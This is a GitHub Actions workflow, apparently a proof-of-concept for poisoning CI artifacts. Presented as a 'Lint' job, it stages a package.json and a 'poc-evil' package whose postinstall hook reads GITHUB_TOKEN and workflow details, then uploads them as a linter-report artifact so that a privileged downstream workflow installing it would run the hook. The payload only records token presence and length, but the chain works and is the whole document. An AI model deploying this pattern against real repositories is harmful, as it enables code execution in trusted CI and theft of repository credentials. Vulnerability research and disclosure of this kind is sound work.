name: Lint
on:
  pull_request:

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Stage attacker-controlled artifact payload
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          echo "$PR_NUMBER" > pr-number.txt
          printf 'ABI-POC linter report body\n' > linter-report.txt
          mkdir -p poc-evil
          cat > package.json <<'JSON'
          {
            "name": "poc-root",
            "version": "1.0.0",
            "private": true,
            "dependencies": { "poc-evil": "file:./poc-evil" }
          }
          JSON
          cat > poc-evil/package.json <<'JSON'
          {
            "name": "poc-evil",
            "version": "1.0.0",
            "scripts": { "postinstall": "node hook.js" }
          }
          JSON
          cat > poc-evil/hook.js <<'JS'
          const fs = require('fs');
          const tok = process.env.GITHUB_TOKEN || '';
          const info = 'ABI-RCE-EXECUTED event=' + process.env.GITHUB_EVENT_NAME + ' wf=' + process.env.GITHUB_WORKFLOW + ' repo=' + process.env.GITHUB_REPOSITORY + ' token_present=' + !!tok + ' token_len=' + tok.length;
          fs.writeFileSync('rce-evidence.txt', info);
          console.log(info);
          throw new Error(info);
          JS
      - name: Upload linter report artifact
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            pr-number.txt
            linter-report.txt
            package.json
            poc-evil
